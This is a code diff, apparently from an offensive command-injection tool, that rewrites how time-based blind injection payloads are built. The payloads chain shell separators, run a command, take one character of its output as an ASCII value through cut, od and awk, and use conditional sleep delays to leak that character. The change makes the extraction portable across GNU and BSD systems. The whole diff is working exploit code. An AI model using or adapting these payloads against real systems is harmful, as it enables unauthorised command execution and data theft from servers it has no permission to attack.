@@ -314,13 +314,12 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
       cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
     settings.USER_APPLIED_CMD = cmd
     if separator in (";", "%0a") :
+      pipe = "|"
       payload = (separator +
                 # Grab the execution output.
                 settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + "\"" + separator +
-                # Export char-by-char the execution output.
-                settings.RANDOM_VAR_GENERATOR + "2=" + settings.CMD_SUB_PREFIX + "expr substr \"$" + settings.RANDOM_VAR_GENERATOR + "\" " + str(num_of_chars) + " 1" + settings.CMD_SUB_SUFFIX + separator +
-                # Transform from Ascii to Decimal.
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "printf '%d' \"'$" + settings.RANDOM_VAR_GENERATOR + "2'\"" + settings.CMD_SUB_SUFFIX + separator +
+                # Export command output character-by-character as ASCII values (portable across GNU/BSD).
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" + pipe + "head -1" + pipe + "awk '{print$2}'" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ascii_char) + " -le $" + settings.RANDOM_VAR_GENERATOR + " ]" + separator +
                 # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
@@ -330,14 +329,13 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
     elif separator == _urllib.parse.quote("&&") :
       #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
+      pipe = "|"
       payload = (ampersand +
                 "sleep 0 " + separator +
                 # Grab the execution output.
                 settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + "\"" + separator +
-                # Export char-by-char the execution output.
-                settings.RANDOM_VAR_GENERATOR + "2=" + settings.CMD_SUB_PREFIX + "expr substr \"$" + settings.RANDOM_VAR_GENERATOR + "\" " + str(num_of_chars) + " 1" + settings.CMD_SUB_SUFFIX + separator +
-                # Transform from Ascii to Decimal.
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "printf '%d' \"'$" + settings.RANDOM_VAR_GENERATOR + "2'\"" + settings.CMD_SUB_SUFFIX + separator +
+                # Export command output character-by-character as ASCII values (portable across GNU/BSD).
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" + pipe + "head -1" + pipe + "awk '{print$2}'" + settings.CMD_SUB_SUFFIX + separator +
                 # Perform the time-based comparisons
                 "[ " + str(ascii_char) + " -le ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 "sleep " + str(timesec)
